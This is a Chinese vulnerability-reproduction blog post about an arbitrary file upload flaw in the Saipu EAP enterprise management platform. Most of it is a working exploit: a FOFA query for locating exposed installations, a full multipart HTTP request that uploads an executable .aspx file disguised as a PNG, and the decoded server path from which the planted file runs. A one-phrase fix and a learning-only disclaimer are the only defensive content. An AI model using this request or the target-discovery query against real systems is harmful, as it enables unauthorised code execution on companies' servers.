#  【漏洞复现】赛普EAP企业适配管理平台Upload任意文件上传漏洞   
原创 清风  白帽攻防   2024-12-06 01:09  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
  
赛普EAP企业适配管理平台是为房地产企业量身定制的数字化管理系统，旨在优化业务流程、提升管理效率并改善客户体验。该系统整合了项目管理、销售管理、客户关系管理、财务管理和报表分析等多个功能模块，能够满足企业各个层级和不同部门的管理需求。通过灵活的配置机制，平台可以根据企业的具体需求进行定制化调整，从而实现与企业业务的高度契合。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eNwBXo1YMdfJgMnngrrVVl4wgcibhf7rzIc03WPLJGfNibwAAb6ETiaMY0tmk5VI6Hofok86ZtSBBeQ/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞描述  
  
  
  
赛普EAP企业适配管理平台的Upload接口存在任意文件上传漏洞  
fofa语法```
body="IDWebSoft/"
```  
漏洞复现```
POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
Host: IP
Priority: u=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------328367279028471380642525145085
Accept: */*
Content-Length: 251
-----------------------------328367279028471380642525145085
Content-Disposition: form-data; name="Filedata"; filename="222.aspx"
Content-Type: image/png
<% response.write("222")%>
-----------------------------328367279028471380642525145085--
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eNwBXo1YMdfJgMnngrrVVlRY5toLRDWpN2bCKJ2ZSoFHZ0QwEfR7Y7XdfX0RmQ5p1OBghLznEKKw/640?wx_fmt=png&from=appmsg "")  
```
%7b%22name%22%3a%22222.aspx%22%2c%22path%22%3a%22%2fAccessary%2f2024%2f12%2f8861daf2-8569-4f07-8af7-81f7ed18dc6c.aspx%22%7d
url解码为{"name":"222.aspx","path":"/Accessary/2024/12/8861daf2-8569-4f07-8af7-81f7ed18dc6c.aspx"}
访问上传地址即可  http://IP/IDWebSoft/Accessary/2024/12/8861daf2-8569-4f07-8af7-81f7ed18dc6c.aspx
```  
修复建议  
限制文件类型  
  
  
  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
